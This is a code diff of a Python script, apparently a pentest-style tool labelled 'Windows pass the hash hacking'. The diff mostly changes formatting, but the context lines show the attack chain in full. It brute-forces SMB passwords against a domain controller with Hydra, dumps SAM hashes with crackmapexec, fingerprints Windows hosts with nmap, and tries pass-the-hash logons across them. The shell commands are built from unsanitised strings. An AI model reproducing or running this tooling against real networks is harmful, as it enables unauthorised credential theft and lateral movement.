@@ -1,3 +1,6 @@
+# -*- coding: utf-8 -*-
+
+
 import argparse
 import re
 import shutil
@@ -5,20 +8,14 @@ import subprocess
 import sys
 
 
-
-
 # Step 0.5: Use Hydra to get a working password given a user account and domain IP address
 # ip: a string IP address for the domain controller
 # username: string (for the above IP)
 # dictionary: a txt file of passwords to try with the username above
 # Returns: a string containing a working password for the above username
-
 def hydraPass(ip, username, dictionary):
     command = 'hydra -l '+ username + ' -P ' + dictionary + ' smb://' + ip + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^password:$/{print $7}'"""
     return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
-    
-
-
 
 
 # Step 1: use crackmapexec to do a SAM grab
@@ -29,6 +26,7 @@ def hydraPass(ip, username, dictionary):
 def samGrab(ip, username, password):
     command = 'crackmapexec --sam ' + ip + ' -u ' + username + ' -p ' + password + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^.*:::$/{print $6}'"""
     return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
+
 
 # Step 2: use nmap to find windows machines on the network
 # ip: a string IP address (potentially containing ranges) for the network
@@ -63,6 +61,7 @@ def osFingerprint(ipRange):
             result.append(thisip[0])
     return result
 
+
 # Step 3: use crackmapexec to try and log on to the windows machines
 # hashes: the correctly formatted (List of tuples) hashes from the SAM grab
 # ips: list of windows IPs found in step 2
@@ -79,9 +78,6 @@ def attemptLogon(hashes, ips):
             results[ip].append((username, result))
     return results
 
-# Step 4: can probably do this in main
-
-# Helper methods
 
 # input: list of hashes
 # output: List of tuples (username, hash) for use in crackmapexec logon attempts
@@ -99,6 +95,7 @@ def formatCrackmapSam(hashes):
         result.append((username, hash_pass))
     return result
 
+
 def check_executables(executables):
     """Check if required programs are present on system before continuing"""
     not_found = []
@@ -107,6 +104,7 @@ def check_executables(executables):
             not_found.append(executable)
 
     return not_found
+
 
 def main():
     parser = argparse.ArgumentParser(description='Windows pass the hash hacking')
